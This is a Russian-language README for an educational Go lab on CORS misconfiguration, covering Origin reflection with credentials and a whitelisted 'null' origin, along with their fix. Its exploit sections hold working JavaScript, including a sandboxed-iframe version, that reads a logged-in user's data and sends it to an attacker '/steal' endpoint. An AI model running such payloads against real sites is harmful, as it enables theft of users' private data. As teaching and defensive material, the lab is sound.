# CORS Misconfiguration: отражение Origin и доверие к `null`

> ⚠️ Учебный проект. Код в `vulnerable/` намеренно уязвим — не используйте его в продакшене.

Демонстрация двух типичных ошибок конфигурации CORS в Go-сервере, их эксплуатации из браузера и исправления.

## Структура

```
.
├── vulnerable/   # сервер с уязвимой CORS-конфигурацией
├── fixed/        # исправленная версия
├── attacker/
│   └── evil.html # страница злоумышленника
└── README.md
```

## Как запустить

```bash
# уязвимый (или исправленный) сервер — http://localhost:8000
cd vulnerable && go run .

# сервер злоумышленника — http://localhost:9000
cd attacker && python3 main.py 
```

1. Залогиниться: открыть `http://localhost:8000/login` — сервер выставит cookie сессии.
2. Открыть `http://localhost:9000`.

## Эндпоинты

| Метод | Путь       | Описание                                          |
|-------|------------|---------------------------------------------------|
| GET   | `/login`   | Выставляет cookie `session`                        |
| GET   | `/me`  | Возвращает данные пользователя по cookie сессии    |

## Уязвимость 1: отражение Origin

### Суть

Сервер копирует значение заголовка `Origin` из запроса в `Access-Control-Allow-Origin` и при этом разрешает передачу credentials:

```
Access-Control-Allow-Origin: <любой Origin из запроса>
Access-Control-Allow-Credentials: true
```

Это фактически отключает Same-Origin Policy для этого API: **любой** сайт может от имени залогиненного пользователя сделать запрос с его cookie и прочитать ответ.

### Проверка

```bash
curl -i -H "Origin: http://evil.example" -b "session=abc123" http://localhost:8000/me
```

В ответе — `Access-Control-Allow-Origin: http://evil.example` и данные пользователя.

### Эксплуатация

Страница злоумышленника выполняет запрос с `credentials: "include"`, читает ответ и отправляет его на свой сервер:

```js
fetch("http://localhost:8000/me", { credentials: "include" })
  .then(r => r.text())
  .then(data => fetch("/steal?d=" + encodeURIComponent(data)));
```

Украденные данные появляются в логе сервера злоумышленника (`GET /steal?d=...`).

<!-- Скриншот: украденные данные на странице / в логе -->

## Уязвимость 2: доверие к `Origin: null`

### Суть

Значение `null` в белом списке разрешённых origin (часто добавляют «для локальной разработки»). Браузер отправляет `Origin: null` из документов с непрозрачным origin — и злоумышленник может создать такой документ сам.

### Проверка

```bash
curl -i -H "Origin: null" -b "session=abc123" http://localhost:8000/me
```

### Эксплуатация

Запрос отправляется из iframe с атрибутом `sandbox` без `allow-same-origin` — у такого документа origin равен `null`:

```html
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('http://localhost:8000/me', { credentials: 'include' })
  .then(r => r.text())
  .then(d => fetch('http://localhost:9000/steal?d=' + encodeURIComponent(d)));
</script>"></iframe>
```

В DevTools → Network видно, что запрос ушёл с `Origin: null`.

Другие источники `Origin: null`: документы, открытые через `file://`, `data:`-URL, некоторые кросс-доменные редиректы.

<!-- Скриншот: Origin: null в DevTools -->

## Роль SameSite: почему атака работает не всегда

Выяснилось в ходе экспериментов:

| Сценарий | Cookie `SameSite=Lax` | Cookie `SameSite=None; Secure` |
|---|---|---|
| Атакующий на `localhost:9000` (другой origin, **тот же site**) | ✅ атака работает | ✅ атака работает |
| Атакующий на `127.0.0.1:9000` (другой site) | ❌ cookie не отправляется | ✅ атака работает* |
| Sandbox-iframe с `Origin: null` | ❌ cookie не отправляется | ✅ атака работает* |

\* если браузер не блокирует сторонние cookie.

**Вывод:** `SameSite=Lax` (значение по умолчанию в Chrome) существенно снижает риск CORS-ошибок при атаке с чужого сайта. Но уязвимость остаётся опасной:

- если приложению нужен `SameSite=None` (виджеты, встраивание, SSO);
- если злоумышленник контролирует соседний поддомен (через XSS или захват поддомена) — запрос с него считается same-site, и `Lax`-cookie отправляется.

Защита должна быть на уровне CORS, а не полагаться только на SameSite.

## Исправление

Явный белый список с **точным** сравнением строк:

```go
var allowed_list = map[string]bool {
	"http://localhost:8000": true,
}
func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		origin := r.Header.Get("Origin")
		w.Header().Set("Vary", "Origin")

		if allowed_list[origin] {
			w.Header().Set("Access-Control-Allow-Origin", origin)
			w.Header().Set("Access-Control-Allow-Credentials", "true")
		}

		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}

		next.ServeHTTP(w, r)
	})
}
```

Принципы:

- **Точное совпадение**, без `strings.HasSuffix`, `strings.Contains` и регулярок без якорей — иначе обход через `eviltrusted.com` или `trusted.com.evil.com`.
- **`null` никогда не попадает в белый список.**
- **`Vary: Origin`** — чтобы кэш (CDN, прокси) не отдал ответ с заголовком для одного origin запросу с другого.
- `Access-Control-Allow-Credentials: true` — только когда это действительно нужно.
- Cookie сессии: `HttpOnly`, `Secure`, `SameSite=Lax` или `Strict` — как дополнительный слой защиты.

## Проверка исправления

```bash
curl -i -H "Origin: http://evil.example" -b "session=<значение>" http://localhost:8000/me
curl -i -H "Origin: null"                -b "session=<значение>" http://localhost:8000/me
```

В обоих ответах нет `Access-Control-Allow-Origin`. В браузере обе атаки завершаются CORS-ошибкой в консоли, данные не утекают.

## Выводы

1. CORS не механизм защиты, а контролируемое **ослабление** Same-Origin Policy. Каждый разрешённый origin — это доверие.
2. Отражение Origin вместе с `Allow-Credentials: true` равносильно отключению SOP для API.
3. `null` — не «пустое значение», а origin, который злоумышленник может получить сам.
4. SameSite-cookie снижают риск, но не заменяют корректную CORS-конфигурацию.

